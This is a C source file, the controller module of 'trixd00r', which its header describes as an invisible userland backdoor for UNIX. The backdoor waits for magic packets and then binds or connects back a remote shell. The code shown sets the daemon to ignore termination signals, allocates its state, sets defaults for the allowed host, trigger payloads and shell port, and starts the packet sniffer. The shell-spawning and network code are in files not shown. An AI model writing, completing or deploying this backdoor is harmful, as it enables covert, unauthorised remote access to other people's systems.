/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/controller.c                                                     *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "controller.h"
#include "sniffer.h"
#include "shell.h"
#include "checks.h"
#include "signals.h"
#include "verbose.h"
#include "wrapper.h"
#include "error.h"



/* just free everything we have to free */
void free_trixd00rd(ctrl_t *ctrl)
{
    if (ctrl->shell != NULL) {
        free(ctrl->shell);
    }
    if (ctrl->sniffer != NULL) {
        free(ctrl->sniffer);
    }
    if (ctrl->packet != NULL) {
        free(ctrl->packet);
    }
    if (ctrl != NULL) {
        free(ctrl);
    }

    return;
}


/* ignore or handle some signals */
void install_signals()
{
    xsignal(SIGTERM, SIG_IGN);
    xsignal(SIGHUP, SIG_IGN);
    xsignal(SIGINT, SIG_IGN);
    xsignal(SIGUSR1, SIG_IGN);
    xsignal(SIGUSR2, SIG_IGN);

    /* here we do not ignore SIGCHLD, because we need to be without zombies */
    xsignal(SIGCHLD, sig_chld);

    return;
}


/* allocate buffer for each struct and fill in with zeros */
ctrl_t *alloc_structs()
{
    ctrl_t *ctrl = NULL;


    ctrl = (ctrl_t *) alloc_buff(sizeof(ctrl_t));
    ctrl->sniffer = (sniffer_t *) alloc_buff(sizeof(sniffer_t));
    ctrl->packet = (packet_t *) alloc_buff(sizeof(packet_t));
    ctrl->shell = (shell_t *) alloc_buff(sizeof(shell_t));

    return ctrl;
}


/* default settings for ctrl_t {} - prior to our complete definition */
ctrl_t *set_ctrl_defaults(ctrl_t *ctrl)
{
    ctrl->packet->allowed_host = DEF_HOST;
    ctrl->packet->type = DEF_TYPE;
    ctrl->packet->m_payload = DEF_PAYLOAD;
    ctrl->packet->b_payload = DEF_BYE_PAYLOAD;
    ctrl->shell->banner = BANNER_ON;
    ctrl->shell->mode = DEF_MODE;
    ctrl->shell->port = DEF_PORT;
    ctrl->verbose = QUIET;

    return ctrl;
}


/* begin of trixd00rd */
void start_trixd00rd(ctrl_t *ctrl)
{
    __VERBOSE_PREPARE;
    prepare_sniffer(ctrl);

    __VERBOSE_WATCH;
    if (watch_packet(ctrl) == IS_BYEBYE_PACKET) {
        end_trixd00rd(ctrl);
    }

    return;
}


/* end of trixd00rd */
void end_trixd00rd(ctrl_t *ctrl)
{
    __VERBOSE_END;
    pcap_close(ctrl->sniffer->handle);
    free_trixd00rd(ctrl);

    return;
}

/* EOF */
